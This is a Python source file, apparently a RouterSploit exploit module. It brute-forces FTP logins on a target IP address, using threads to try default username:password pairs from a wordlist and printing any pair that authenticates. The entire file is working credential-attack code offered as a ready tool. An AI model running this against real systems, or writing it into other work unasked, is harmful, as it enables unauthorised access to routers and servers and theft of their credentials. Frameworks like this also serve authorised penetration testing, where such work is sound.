import threading
import ftplib
import socket

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Module perform dictionary attack with default credentials against FTP service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'FTP Default Creds',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
         ]
    }

    target = exploits.Option('', 'Target IP address')
    port = exploits.Option(21, 'Target port')

    threads = exploits.Option(8, 'Numbers of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass pair or file with default credentials (file://)')

    credentials = []

    def run(self):
        print_status("Running module...")

        self.credentials = []
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.target, port=int(self.port), timeout=10)
        except socket.error, socket.timeout:
            print_error("Connection error: %s:%s" % (self.target, str(self.port)))
            ftp.close()
            return
        except:
            pass
        ftp.close()

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        name = threading.current_thread().name

        print_status(name, 'process is starting...')

        ftp = ftplib.FTP()
        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].strip()
                password = line[1].strip()    
            except StopIteration:
                break
            else:
                retries = 0
                while retries < 3:
                    try:
                        ftp.connect(self.target, port=int(self.port), timeout=10)
                        break
                    except:
                        print_error("{} Connection problem. Retrying...".format(name))
                        retries += 1

                        if retries > 2:
                            print_error("Too much connection problems. Quiting...")
                            return
                
                try:
                    ftp.login(user, password)

                    running.clear()
                    print_success("{}: Authentication succeed!".format(name), user, password)
                    self.credentials.append((user, password))
                except:
                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))

                ftp.close()

        print_status(name, 'process is terminated.')
